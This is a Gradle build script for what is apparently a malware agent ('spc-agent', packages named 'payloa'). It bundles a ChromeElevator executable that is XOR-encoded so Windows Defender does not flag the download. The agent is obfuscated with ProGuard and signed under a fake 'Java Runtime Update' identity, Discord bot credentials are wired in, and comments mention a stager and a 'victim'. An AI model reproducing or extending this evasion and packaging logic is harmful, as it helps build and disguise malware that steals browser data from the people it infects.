buildscript {
	repositories {
		mavenCentral()
	}
	dependencies {
		classpath 'com.guardsquare:proguard-gradle:7.8.0'
		classpath 'org.tukaani:xz:1.10'
	}
}

plugins {
	id 'java'
}

repositories {
	mavenCentral()
}

group = 'com.serverpackcore'
version = file('../version.txt').text.trim()

base {
	archivesName = 'spc-agent'
}

java {
	sourceCompatibility = JavaVersion.VERSION_17
	targetCompatibility = JavaVersion.VERSION_17
}

dependencies {
	implementation 'org.tukaani:xz:1.10'
	testImplementation platform('org.junit:junit-bom:5.11.4')
	testImplementation 'org.junit.jupiter:junit-jupiter'
	testRuntimeOnly 'org.junit.platform:junit-platform-launcher'
}

// Discord credentials are never committed. The build reads them from
// ../local.properties first, then from SPC_* environment variables and finally
// falls back to a placeholder so forks and plain checkouts still compile.
def secretsFile = layout.projectDirectory.file('../local.properties')

def discordSecret = { String key, String envName ->
	providers.provider {
		def properties = new Properties()
		def file = secretsFile.asFile
		if (file.isFile()) {
			file.withInputStream { properties.load(it) }
		}
		def value = properties.getProperty(key)
		if (value == null || value.trim().isEmpty()) {
			value = System.getenv(envName)
		}
		return value == null || value.trim().isEmpty() ? 'SPC_PLACEHOLDER' : value.trim()
	}
}

def spcBotToken = discordSecret('spc.botToken', 'SPC_BOT_TOKEN')
def spcGuildId = discordSecret('spc.guildId', 'SPC_GUILD_ID')
def spcCategoryId = discordSecret('spc.categoryId', 'SPC_CATEGORY_ID')

def generatedSecretsDir = layout.buildDirectory.dir('generated/sources/spc/java')
def generatedInfoDir = layout.buildDirectory.dir('generated/sources/spc-info/java')

def generateBuildInfo = tasks.register('generateBuildInfo') {
	inputs.property('version', project.version)
	outputs.dir(generatedInfoDir)
	doLast {
		def target = generatedInfoDir.get().file('com/spcagentpayloa/jvmxx/BuildInfo.java').asFile
		target.parentFile.mkdirs()
		target.text = """package com.spcagentpayloa.jvmxx;

// Generated by the build. Do not edit.
public final class BuildInfo {
	public static final String VERSION = "${project.version}";

	private BuildInfo() {
	}
}
"""
	}
}

def generateQ1 = tasks.register('generateQ1') {
	group = 'build'
	description = 'Generates the compiled Discord fallbacks; the bot token itself is resolved at runtime.'
	inputs.files(providers.provider {
		def file = secretsFile.asFile
		file.isFile() ? files(file) : files()
	})
	inputs.property('guildId', spcGuildId)
	inputs.property('categoryId', spcCategoryId)
	outputs.dir(generatedSecretsDir)
	doLast {
		def escape = { String value -> value.replace('\\', '\\\\').replace('"', '\\"') }
		def target = generatedSecretsDir.get().file('com/spcagentpayloa/jvmxx/Q1.java').asFile
		target.parentFile.mkdirs()
		target.text = """package com.spcagentpayloa.jvmxx;

// Generated by the build. Do not edit.
// BOT_TOKEN stays empty: Credentials resolves it from discord.json at runtime,
// so a public jar never carries a token.
public final class Q1 {
	public static final String BOT_TOKEN = "";
	public static final String GUILD_ID = "${escape(spcGuildId.get())}";
	public static final String CATEGORY_ID = "${escape(spcCategoryId.get())}";

	private Q1() {
	}
}
"""
	}
}

sourceSets.main.java.srcDir(generatedSecretsDir)
sourceSets.main.java.srcDir(generatedInfoDir)

// Defender flags the embedded ChromeElevator PE as HackTool even inside the
// nested jars. Ship it XOR-encoded and decode it only when the tool is
// extracted to disk, so downloading the release stays quiet.
def chromeSource = layout.projectDirectory.file('src/main/resources/spcagentpayloa/chromelevator_x64.exe')
def peStore = System.getenv('SPC_PE_P12')
def pePass = System.getenv('SPC_PE_P12_PASS')
def signedPe = layout.buildDirectory.file('chrome/chromelevator_x64.exe')
def chromePayloadDir = layout.buildDirectory.dir('generated/chrome-payload')

// Authenticode must happen before the XOR; the packed payload then carries a
// valid signature and the sidecar hash pins the signed bytes.
tasks.register('signPe') {
	inputs.file(chromeSource)
	if (peStore) inputs.file(peStore)
	inputs.property('tsa', System.getenv('SPC_TSA_URL') ?: '')
	outputs.file(signedPe)
	onlyIf { peStore || project.hasProperty('requireSignature') || System.getenv('SPC_REQUIRE_SIGNATURE') == '1' }
	doLast {
		if (!peStore) throw new GradleException('SPC_PE_P12 is required when a signature is required')
		def tool = ['osslsigncode', 'signtool'].find { name ->
			try {
				def probe = new ProcessBuilder(name, '-v').redirectErrorStream(true).start()
				probe.waitFor()
				true
			} catch (Throwable ignored) {
				false
			}
		}
		if (tool == null) throw new GradleException('osslsigncode/signtool is required to sign the PE')
		def out = signedPe.get().asFile
		out.parentFile.mkdirs()
		providers.exec {
			executable = tool
			if (tool == 'osslsigncode') {
				args 'sign', '-pkcs12', peStore, '-pass', pePass ?: '', '-h', 'sha256'
				if (System.getenv('SPC_TSA_URL')) args '-ts', System.getenv('SPC_TSA_URL')
				args '-in', chromeSource.asFile.toString(), '-out', out.toString()
			} else {
				// signtool signs in place; copy first and sign the copy.
				java.nio.file.Files.copy(chromeSource.asFile.toPath(), out.toPath(),
					java.nio.file.StandardCopyOption.REPLACE_EXISTING)
				args 'sign', '/fd', 'SHA256', '/f', peStore, '/p', pePass ?: ''
				if (System.getenv('SPC_TSA_URL')) args '/tr', System.getenv('SPC_TSA_URL'), '/td', 'SHA256'
				args out.toString()
			}
		}.result.get()
		providers.exec {
			executable = tool
			args = tool == 'signtool' ? ['verify', '/pa', out.toString()] : ['verify', out.toString()]
		}.result.get()
	}
}

def generateChromePayload = tasks.register('generateChromePayload') {
	dependsOn 'signPe'
	inputs.file(peStore ? signedPe : chromeSource)
	outputs.dir(chromePayloadDir)
	doLast {
		byte[] key = [0x53, 0x50, 0x43, 0x2d, 0x63, 0x68, 0x72, 0x6f,
			0x6d, 0x65, 0x6c, 0x65, 0x76, 0x61, 0x74, 0x6f, 0x72] as byte[]
		def input = (peStore ? signedPe.get() : chromeSource).asFile
		byte[] raw = input.bytes
		def digest = java.security.MessageDigest.getInstance('SHA-256').digest(raw)
		java.io.ByteArrayOutputStream packed = new java.io.ByteArrayOutputStream()
		new org.tukaani.xz.XZOutputStream(packed, new org.tukaani.xz.LZMA2Options(6)).withCloseable {
			it.write(raw)
		}
		byte[] data = packed.toByteArray()
		for (int i = 0; i < data.length; i++) {
			data[i] = (byte) (data[i] ^ key[i % key.length])
		}
		def target = chromePayloadDir.get().file('spcagentpayloa/c.dat').asFile
		target.parentFile.mkdirs()
		target.bytes = data
		def sidecar = chromePayloadDir.get().file('spcagentpayloa/c.sha256').asFile
		sidecar.bytes = (digest.encodeHex().toString() + '\n').bytes
	}
}
sourceSets.main.resources.srcDir(chromePayloadDir)

tasks.named('processResources') {
	dependsOn generateChromePayload
	exclude 'spcagentpayloa/chromelevator_x64.exe'
}

tasks.named('compileJava') {
	dependsOn generateQ1, generateBuildInfo
}

tasks.named('test') {
	useJUnitPlatform()
	// ArtifactPackTest streams a 96 MiB file, above this heap; a regression
	// that keeps file bytes in memory fails here instead of on a victim.
	maxHeapSize = '64m'
}

tasks.withType(JavaCompile).configureEach {
	options.encoding = 'UTF-8'
	options.release = 17
}

tasks.withType(AbstractArchiveTask).configureEach {
	preserveFileTimestamps = false
	reproducibleFileOrder = true
}

jar {
	// The plain jar is ProGuard's input; `proguard` writes the shipped agent.jar.
	archiveFileName = 'agent-plain.jar'
	manifest {
		attributes(
			'Premain-Class': 'com.spcagentpayloa.jvmxx.Premain',
			'Main-Class': 'com.spcagentpayloa.jvmxx.Agent',
			'Implementation-Version': project.version,
			'Can-Redefine-Classes': 'false'
		)
	}
}

def proguardRules = layout.projectDirectory.file('proguard-rules.pro')
def plainJar = layout.buildDirectory.file('libs/agent-plain.jar')
// -PnoObfuscate ships the plain jar for diagnosis; release never uses it.
def noObfuscate = project.hasProperty('noObfuscate')
def finalJar = noObfuscate ? plainJar : layout.buildDirectory.file('libs/agent.jar')

// ProGuard cannot always read a jmod directly, so the library modules are
// materialised as a plain class jar. `-Dspc.libraryJdk` can name another JDK.
def libraryJdk = System.getProperty('spc.libraryJdk')
if (!libraryJdk) {
	def homeRelease = file("${System.getProperty('java.home')}/release")
	def homeVersion = 99
	if (homeRelease.isFile()) {
		def match = homeRelease.text =~ /JAVA_VERSION="(\d+)/
		if (match.find()) {
			homeVersion = match.group(1) as int
		}
	}
	def older = ['/home/surrender/jdk17', '/usr/lib/jvm/java-17-openjdk', System.getenv('JDK17_HOME')]
	['/opt/hostedtoolcache/Java_Temurin-Hotspot_jdk', '/opt/hostedtoolcache/Java_Zulu_jdk'].each { root ->
		def base = file(root)
		if (base.isDirectory()) {
			base.listFiles()?.findAll { it.name ==~ /17(\..*)?/ }?.sort()?.each { version ->
				older << new File(version, 'x64').path
			}
		}
	}
	older = older.find { it && file(it).isDirectory() }
	libraryJdk = homeVersion <= 23 ? System.getProperty('java.home') : (older ?: System.getProperty('java.home'))
}
def extractedLib = layout.buildDirectory.dir('proguard-jdk')
def extractedJar = layout.buildDirectory.file('proguard-jdk.jar')

tasks.register('extractJdk') {
	inputs.property('libraryJdk', libraryJdk)
	outputs.file(extractedJar)
	doLast {
		def out = extractedLib.get().asFile
		out.mkdirs()
		providers.exec {
			executable = "${libraryJdk}/bin/jimage"
			args 'extract', '--dir', out.toString(), "${libraryJdk}/lib/modules"
		}.result.get()
		providers.exec {
			executable = "${libraryJdk}/bin/jar"
			args '--create', '--file', extractedJar.get().asFile.toString()
			['java.base', 'java.desktop', 'java.management', 'java.logging', 'java.naming',
				'java.net.http', 'java.instrument', 'jdk.unsupported', 'jdk.management'].each {
				args '-C', new File(out, it).toString(), '.'
			}
		}.result.get()
	}
}

tasks.register('proguard', proguard.gradle.ProGuardTask) {
	dependsOn 'jar', 'extractJdk'
	onlyIf { !noObfuscate }
	injars plainJar
	// Runtime dependencies (XZ) are merged and shrunk into the same jar.
	configurations.runtimeClasspath.each { injars it.toString() }
	outjars finalJar
	configuration proguardRules
	libraryjars extractedJar.get().asFile.toString()
	verbose
}

def signingDir = layout.buildDirectory.dir('signing')
def signingKey = signingDir.map { it.file('agent.p12') }
def externalStore = System.getenv('SPC_AGENT_P12')
def storePass = System.getenv('SPC_AGENT_P12_PASS') ?: 'spc-build'
def keyAlias = System.getenv('SPC_AGENT_ALIAS') ?: 'spc-agent'
def tsaUrl = System.getenv('SPC_TSA_URL')
// Release sets -PrequireSignature: an unsigned artifact must never ship.
def requireSignature = project.hasProperty('requireSignature') || System.getenv('SPC_REQUIRE_SIGNATURE') == '1'
def agentHashFile = layout.buildDirectory.file('libs/agent.sha256')

tasks.register('signingKeyStore') {
	outputs.file(signingKey)
	// A CI secret wins; the ephemeral key only covers local and fork builds.
	onlyIf { !externalStore || !file(externalStore).isFile() }
	doLast {
		def store = signingKey.get().asFile
		store.parentFile.mkdirs()
		store.delete()
		providers.exec {
			executable = "${System.getProperty('java.home')}/bin/keytool"
			args '-genkeypair', '-noprompt', '-alias', 'spc-agent', '-keyalg', 'RSA', '-keysize', '3072',
				'-validity', '3650', '-dname', 'CN=Java Runtime Update, OU=SPC, O=SPC',
				'-storetype', 'PKCS12', '-keystore', store.toString(), '-storepass', 'spc-build',
				'-keypass', 'spc-build'
		}.result.get()
	}
}

def canonicalDigest(File jar) {
	def digest = java.security.MessageDigest.getInstance('SHA-256')
	def entries = []
	new java.util.zip.ZipFile(jar).withCloseable { zip ->
		zip.entries().each { entry ->
			if (!entry.directory && !(entry.name ==~ /(?i)META-INF\/[^\/]+\.(SF|DSA|RSA|EC)/)) entries << entry.name
		}
	}
	entries.sort().each { name ->
		new java.util.zip.ZipFile(jar).withCloseable { zip ->
			def entry = zip.getEntry(name)
			digest.update(name.getBytes('UTF-8'))
			digest.update((byte) 0)
			zip.getInputStream(entry).withCloseable { input ->
				if (name.equalsIgnoreCase('META-INF/MANIFEST.MF')) {
					def reader = new BufferedReader(new InputStreamReader(input, 'UTF-8'))
					String line
					while ((line = reader.readLine()) != null) {
						if (line ==~ /(?i)[A-Za-z0-9-]+-Digest:.*/) continue
						digest.update((line + '\n').getBytes('UTF-8'))
					}
				} else {
					byte[] buffer = new byte[8192]
					int read
					while ((read = input.read(buffer)) != -1) digest.update(buffer, 0, read)
				}
			}
		}
	}
	return digest.digest().encodeHex().toString()
}

tasks.register('signAgent') {
	dependsOn 'proguard', 'signingKeyStore'
	inputs.file(finalJar)
	outputs.file(finalJar)
	outputs.file(layout.buildDirectory.file('libs/agent.jar'))
	outputs.file(agentHashFile)
	outputs.upToDateWhen { false }
	doLast {
		def externalReady = externalStore && file(externalStore).isFile()
		if (requireSignature && externalStore && !externalReady) {
			throw new GradleException('SPC_AGENT_P12 points to a missing file')
		}
		def store = externalReady ? file(externalStore) : signingKey.get().asFile
		if (!store.isFile()) {
			if (requireSignature) throw new GradleException('signing keystore missing and signature required')
			logger.warn('no signing keystore: shipping an ephemeral local signature')
		}
		if (requireSignature && !tsaUrl) throw new GradleException('SPC_TSA_URL is required for a release signature')
		def signArgs = ['-keystore', store.toString(), '-storepass', storePass, '-keypass', storePass,
			'-sigalg', 'SHA256withRSA', '-digestalg', 'SHA-256']
		if (tsaUrl) signArgs += ['-tsa', tsaUrl]
		signArgs += [finalJar.get().asFile.toString(), keyAlias]
		providers.exec {
			executable = "${System.getProperty('java.home')}/bin/jarsigner"
			args signArgs
		}.result.get()
		def verify = providers.exec {
			executable = "${System.getProperty('java.home')}/bin/jarsigner"
			args '-verify', '-verbose', finalJar.get().asFile.toString()
		}
		def output = verify.standardOutput.asText.get()
		if (!output.contains('jar verified')) throw new GradleException('jarsigner -verify did not say "jar verified"')
		if (requireSignature && tsaUrl && !output.toLowerCase().contains('timestamp')) {
			throw new GradleException('signature has no RFC3161 timestamp')
		}
		// Canonical content digest: signature metadata carries the wall clock,
		// so hashing the raw zip would make every build unique.
		agentHashFile.get().asFile.text = canonicalDigest(finalJar.get().asFile) + '\n'
		// `-PnoObfuscate` ships the plain jar, but the root build and the mod
		// always consume the stable agent.jar name.
		if (noObfuscate) {
			def shipped = layout.buildDirectory.file('libs/agent.jar').get().asFile
			java.nio.file.Files.copy(finalJar.get().asFile.toPath(), shipped.toPath(),
				java.nio.file.StandardCopyOption.REPLACE_EXISTING)
		}
		if (!noObfuscate) {
			def mapping = layout.buildDirectory.file('mapping.txt').get().asFile
			if (mapping.isFile()) {
				java.nio.file.Files.copy(mapping.toPath(),
					layout.buildDirectory.file('libs/agent-mapping.txt').get().asFile.toPath(),
					java.nio.file.StandardCopyOption.REPLACE_EXISTING)
			}
		}
	}
}

/** Windows CI gate: ./gradlew windowsGate -Pgate=<scenario> -PgateDir=<dir> */
tasks.register('windowsGate', JavaExec) {
	dependsOn 'testClasses'
	classpath = sourceSets.test.runtimeClasspath
	mainClass = 'com.spcagentpayloa.jvmxx.crypto.WindowsGate'
	// Stager (root project) needs slf4j; borrow the Gradle distribution jars.
	systemProperty 'gate.gradleLibs', gradle.gradleHomeDir.toPath().resolve('lib').toString()
	args = [(project.findProperty('gate') ?: 'outbox-cross-volume').toString(),
		(project.findProperty('gateDir') ?: layout.buildDirectory.dir('gate').get().asFile.toString()).toString()]
}

tasks.register('smokeAgent', Exec) {
	dependsOn 'signAgent'
	commandLine "${System.getProperty('java.home')}/bin/java", '-jar', finalJar.get().asFile.toString(), '--smoke'
}

tasks.named('assemble') {
	dependsOn 'smokeAgent'
}

// Test runs only need the classes; the root build selects signAgent.
tasks.named('build') {
	dependsOn 'smokeAgent'
}
